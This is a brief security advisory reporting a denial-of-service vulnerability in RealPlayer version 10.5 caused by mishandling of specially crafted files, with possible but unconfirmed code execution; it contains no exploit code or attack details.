RealNetwork RealPlayer is prone to a remote denial-of-service vulnerability because the application fails to handle specially crafted files.

Exploiting this issue allows remote attackers to crash the application, denying further service to legitimate users. Arbitrary code execution might be possible, but this is not confirmed.

Version 10.5 is vulnerable to this issue; other versions may also be affected.
